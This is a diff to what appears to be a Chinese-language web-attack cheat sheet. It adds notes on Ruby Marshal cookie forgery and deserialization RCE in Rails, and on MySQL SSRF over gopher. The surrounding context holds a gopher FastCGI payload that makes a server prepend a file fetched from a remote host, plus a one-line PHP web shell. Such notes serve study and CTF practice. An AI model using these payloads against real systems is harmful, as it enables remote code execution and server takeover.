@@ -1164,6 +1164,17 @@ print marshalled
 
 在ERB上，當result或run method被call時，@src的string會被執行
 
+- 常見使用情境：
+    - 以Marshal為Cookie Serializer時，若有`secret_key`，則可以偽造Cookie
+    - 也可以透過`DeprecatedInstanceVariableProxy`去執行ERB的`result`來RCE
+        - 當`DeprecatedInstanceVariableProxy`被unmarshal，rails session對他處理時遇到不認識的method就會呼叫`method_missing`，導致執行傳入的ERB
+        - `@instance.__send__(@method)`
+
+- Cookie Serializer
+    - Rails 4.1以前的Cookie Serializer為Marshal
+    - Rails 4.1開始，默認使用JSON
+
+
 # SSTI 
 
 Server-Side Template Injection
@@ -1329,6 +1340,13 @@ http://[::]
 header( "Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%00%00%00%01%04Zh%00%8b%00%00%0E%03REQUEST_METHODGET%0F%0FSCRIPT_FILENAME/www//index.php%0F%16PHP_ADMIN_VALUEallow_url_include%20=%20On%09%26PHP_VALUEauto_prepend_file%20=%20http://kaibro.tw/x%01%04Zh%00%00%00%00%01%05Zh%00%00%00%00" );`
                 - x: `<?php system($_GET['cmd']); ?>`
                 - visit: `/forum.php?mod=ajax&action=downremoteimg&message=[img]http://kaibro.tw/302.php?.jpg[/img]`
+    - MySQL
+        - 無密碼認證可以SSRF
+        - MySQL Client與Server交互主要分兩階段
+            - Connection Phase
+            - Command Phase
+        - `gopher://127.0.0.1:3306/_<PAYLOAD>`
+
 ## CRLF injection
 
 ### SMTP
